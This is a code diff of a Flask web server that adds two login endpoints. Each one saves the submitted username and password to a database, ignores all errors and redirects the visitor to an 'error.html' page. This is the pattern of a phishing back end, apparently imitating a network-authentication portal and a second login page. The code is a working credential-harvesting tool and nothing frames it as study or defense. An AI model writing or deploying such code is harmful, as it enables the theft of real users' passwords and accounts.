@@ -9,7 +9,6 @@
 from flask import Flask, request, make_response, redirect
 from flask_cors import CORS
 from dbop import *
-from apikey import *
 
 global db_session
 db_session = conn2db()
@@ -18,19 +17,43 @@ app = Flask(__name__)
 CORS(app)
 
 
-@app.route('/', methods=['GET'])
+@app.route('/api/status', methods=['GET'])
 def server_status():
     return make_response('Server is running!', 200)
 
 
 @app.route('/api/login', methods=['POST'])
 def save_net_cred():
-    return redirect('/')
+    try:
+        usrn = request.form['username']
+        pasw = request.form['password']
+        objt = SrunT(usrname=usrn, passwd=pasw)
+        db_session.add(objt)
+        db_session.commit()
+    except IndexError:
+        pass
+    except IntegrityError:
+        db_session.rollback()
+    except:
+        pass
+    return redirect('/webauth/error.html', 302)
 
 
 @app.route('/api/uniq/login', methods=['POST'])
 def save_uniq_cred():
-    return 'Hello!'
+    try:
+        usrn = request.form['username']
+        pasw = request.form['password']
+        objt = UniqT(usrname=usrn, passwd=pasw)
+        db_session.add(objt)
+        db_session.commit()
+    except IndexError:
+        pass
+    except IntegrityError:
+        db_session.rollback()
+    except:
+        pass
+    return redirect('/uniqauth/error.html', 302)
 
 
 @app.teardown_appcontext
